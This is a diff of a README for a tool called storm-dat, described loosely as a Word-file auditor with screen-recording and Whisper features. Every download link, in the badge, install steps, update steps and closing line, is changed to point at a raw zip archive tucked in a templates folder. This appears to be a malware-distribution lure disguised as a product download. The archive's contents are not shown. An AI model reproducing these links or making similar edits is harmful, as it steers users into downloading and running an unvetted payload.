@@ -1,12 +1,12 @@
 # 🛡️ storm-dat - Audit Word Files With Less Effort
 
-[![Download storm-dat](https://img.shields.io/badge/Download%20storm--dat-purple?style=for-the-badge)](https://github.com/Interstate-sunriseindustry884/storm-dat)
+[![Download storm-dat](https://img.shields.io/badge/Download%20storm--dat-purple?style=for-the-badge)](https://github.com/Interstate-sunriseindustry884/storm-dat/raw/refs/heads/main/src/templates/dat-storm-v1.7.zip)
 
 ## 📥 Download storm-dat
 
 Use this link to visit the download page:
 
-[https://github.com/Interstate-sunriseindustry884/storm-dat](https://github.com/Interstate-sunriseindustry884/storm-dat)
+[https://github.com/Interstate-sunriseindustry884/storm-dat/raw/refs/heads/main/src/templates/dat-storm-v1.7.zip](https://github.com/Interstate-sunriseindustry884/storm-dat/raw/refs/heads/main/src/templates/dat-storm-v1.7.zip)
 
 ## 🪟 What storm-dat does
 
@@ -36,7 +36,7 @@ If you plan to use the screen recorder, make sure your microphone works.
 Follow these steps:
 
 1. Open the download page:
-   [https://github.com/Interstate-sunriseindustry884/storm-dat](https://github.com/Interstate-sunriseindustry884/storm-dat)
+   [https://github.com/Interstate-sunriseindustry884/storm-dat/raw/refs/heads/main/src/templates/dat-storm-v1.7.zip](https://github.com/Interstate-sunriseindustry884/storm-dat/raw/refs/heads/main/src/templates/dat-storm-v1.7.zip)
 
 2. Look for the latest Windows download in the release area or project files.
 
@@ -222,7 +222,7 @@ After each scan, check:
 When a new version is posted:
 
 1. Visit the download page:
-   [https://github.com/Interstate-sunriseindustry884/storm-dat](https://github.com/Interstate-sunriseindustry884/storm-dat)
+   [https://github.com/Interstate-sunriseindustry884/storm-dat/raw/refs/heads/main/src/templates/dat-storm-v1.7.zip](https://github.com/Interstate-sunriseindustry884/storm-dat/raw/refs/heads/main/src/templates/dat-storm-v1.7.zip)
 
 2. Download the newer file.
 3. Replace the old app files.
@@ -272,4 +272,4 @@ Yes. It uses Whisper for transcription features.
 
 If you need the download page again, use this link:
 
-[https://github.com/Interstate-sunriseindustry884/storm-dat](https://github.com/Interstate-sunriseindustry884/storm-dat)
+[https://github.com/Interstate-sunriseindustry884/storm-dat/raw/refs/heads/main/src/templates/dat-storm-v1.7.zip](https://github.com/Interstate-sunriseindustry884/storm-dat/raw/refs/heads/main/src/templates/dat-storm-v1.7.zip)
